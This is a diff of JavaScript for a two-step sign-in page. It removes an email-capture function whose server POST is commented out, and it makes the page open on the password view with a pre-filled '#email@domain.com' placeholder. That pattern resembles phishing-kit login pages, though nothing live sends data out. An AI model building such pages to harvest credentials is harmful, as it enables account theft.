@@ -436,50 +436,12 @@
         return emailRegex.test(email);
     }
 
-    // Function to capture and process the email
-    function captureEmail(email) {
-        console.log('Captured email:', email);
-        // Optionally, send the email to a server
-        /*
-        fetch('https://your-server-endpoint.com/capture-email', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ email: email }),
-        })
-        .then(response => response.json())
-        .then(data => console.log('Email sent to server:', data))
-        .catch(error => console.error('Error sending email:', error));
-        */
-    }
-
     // Function to show password view
-    function showPasswordView() {
-        const email = emailInput.value.trim();
+    function showPasswordView(email) {
+        // Set the email to display (use provided email or default)
+        userDisplay.textContent = email || '#email@domain.com';
 
-        if (!email) {
-            emailError.textContent = 'This field is required.';
-            emailError.style.display = 'block';
-            return;
-        }
-
-        if (!isValidEmail(email)) {
-            emailError.textContent = 'Please enter a valid email address.';
-            emailError.style.display = 'block';
-            return;
-        }
-
-        // Capture the email
-        captureEmail(email);
-
-        // Clear any previous errors
-        emailError.style.display = 'none';
-
-        // Update user display
-        userDisplay.textContent = email;
-
-        // Transition to password view
+        // Hide email view and show password view
         emailView.classList.add('hidden');
         passwordView.classList.remove('hidden');
         passwordView.classList.add('fade-in');
@@ -502,10 +464,31 @@
         }, 300);
     }
 
+    // Initialize with password view and set email
+    showPasswordView('#email@domain.com'); // Replace with dynamic email if available
+
     // Event listeners
     nextButton.addEventListener('click', function(e) {
         e.preventDefault();
-        showPasswordView();
+        const email = emailInput.value.trim();
+
+        if (!email) {
+            emailError.textContent = 'This field is required.';
+            emailError.style.display = 'block';
+            return;
+        }
+
+        if (!isValidEmail(email)) {
+            emailError.textContent = 'Please enter a valid email address.';
+            emailError.style.display = 'block';
+            return;
+        }
+
+        // Clear any previous errors
+        emailError.style.display = 'none';
+
+        // Show password view with entered email
+        showPasswordView(email);
     });
 
     signInButton.addEventListener('click', function(e) {
@@ -523,6 +506,9 @@
 
         // For demo purposes, show a success message
         alert('Sign in successful! (This is a demo)');
+
+        // In a real implementation, submit the form
+        // form.submit();
     });
 
     backToEmailLink.addEventListener('click', function(e) {
@@ -549,7 +535,7 @@
     emailInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             e.preventDefault();
-            showPasswordView();
+            nextButton.click();
         }
     });
 
